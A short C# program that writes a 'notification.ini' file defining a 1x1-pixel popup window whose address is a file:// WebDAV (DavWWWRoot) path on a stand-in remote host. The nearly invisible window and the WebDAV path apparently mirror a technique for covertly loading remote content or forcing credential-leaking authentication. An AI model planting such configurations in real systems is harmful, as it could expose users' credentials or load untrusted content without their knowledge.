using System.IO;
class Program {
    static void Main() {
        var popup = @"
[PopWindow28]
Height=1
Address=file://content.example.net/DavWWWRoot/assets/notice.html
Width=1
";
        File.WriteAllText("notification.ini", popup);
    }
}
